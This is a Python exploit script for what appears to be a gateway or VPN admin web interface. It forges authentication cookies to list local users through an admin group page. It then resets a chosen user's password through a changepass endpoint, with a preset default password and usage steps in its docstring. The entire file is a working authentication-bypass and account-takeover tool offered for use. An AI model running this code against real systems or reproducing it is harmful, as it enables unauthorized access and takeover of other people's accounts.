import click
import requests
import re
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxy = {}


def check_poc1(url, uid=2):
    header = {
        "Cookie": "admin_id=1; gw_admin_ticket=1;",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36"
    }
    path = "//admin/group/x_group.php?id=%s" % uid
    r = requests.get(url + path, headers=header, proxies=proxy, verify=False)
    print(r.text)
    r.encoding = "utf-8"
    if r.status_code == 200 and "group_action.php" in r.text:
        users = re.findall("本地认证->(.*?)</option>", r.text)
        if users:
            return users
        else:
            print("not found any user")
            return []


def check_poc2(url, user, pwd):
    header = {
        "Cookie": 'admin_id=1; gw_user_ticket=ffffffffffffffffffffffffffffffff; last_step_param={"this_name":"%s","subAuthId":"1"}' % user,
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36",
        "Origin": url,
        "Referer": "%s/welcome.php" % url
    }
    body = {
        "old_pass": "",
        "password": pwd,
        "repassword": pwd
    }
    path = "/changepass.php?type=2"
    r = requests.post(url + path, headers=header, data=body, proxies=proxy, verify=False)
    print(r.text)
    r.encoding = "utf-8"
    if r.status_code == 200 and "修改密码成功" in r.text:
        return True
    else:
        return False


@click.command()
@click.option("--target", "-t", help="目标", required=True)
@click.option("--group", "-g", default=2, help="用户组", type=int)
@click.option("--user", "-u", help="用户名")
@click.option("--pwd", "-p", default="Asd123!@#123A", help="密码")
@click.option("--list-user", "-lu", is_flag=True)
@click.option("--change-pwd", "-cp", is_flag=True)
@click.option("--proxy", "proxies")
def main(target, group, user, pwd, list_user, change_pwd, proxies):
    """
    step1 : list users exppoc
    python exp.py -t https://1.1.1.1 -lu 
    user1
    user2
    ...
    step2 : change password org

    python exp.py -t https://1.1.1.1 -u user1 -cp 

    """
    global proxy
    if proxies:
        proxy = {
            "http": proxies,
            "https": proxies
        }
    target = target.strip()
    if list_user:
        users = check_poc1(target, group)
        for u in users:
            print(u)
    elif change_pwd and user:
        if check_poc2(target, user, pwd):
            print("修改密码成功")
        else:
            print("修改密码失败")
    else:
        print("参数错误")


if __name__ == '__main__':
    main()
